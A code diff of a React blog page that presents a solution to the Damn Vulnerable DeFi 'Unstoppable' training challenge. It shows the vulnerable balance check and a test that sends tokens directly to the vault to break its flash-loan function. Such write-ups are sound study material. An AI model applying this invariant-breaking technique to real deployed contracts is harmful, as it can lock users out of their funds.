@@ -3,7 +3,7 @@ import CodeSnippet from "../Components/CodeSnippet";
 
 export default function Dvd1() {
   const p = Posts.posts.find(
-    (o) => o.id === "damn-vulnerable-defi-solutions-1-unstoppable"
+    (o) => o.id === "id-here"
   );
   return (
     <div>
@@ -20,7 +20,9 @@ export default function Dvd1() {
         flash loans anymore.
       </p>
       <p>Here is the vulnerable part of the code.</p>
-      <CodeSnippet codeText={p.snippets[0]} />
+      <CodeSnippet
+        codeText={`  if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();`}
+      />
       <h2 className="mb-6">Solution</h2>
       <p>
         If we send some DVT tokens to lender contract manually not using{" "}
@@ -29,7 +31,14 @@ export default function Dvd1() {
         <span className="code-h">flashLoan()</span> function.
       </p>
       <p>In the test file we write our solution:</p>
-      <CodeSnippet codeText={p.snippets[1]} />
+      <CodeSnippet
+        codeText={`  it("Execution", async function () {
+    /** CODE YOUR SOLUTION HERE */
+    await token
+      .connect(player)
+      .transfer(vault.address, ethers.utils.parseEther("1"));
+  });`}
+      />
     </div>
   );
 }
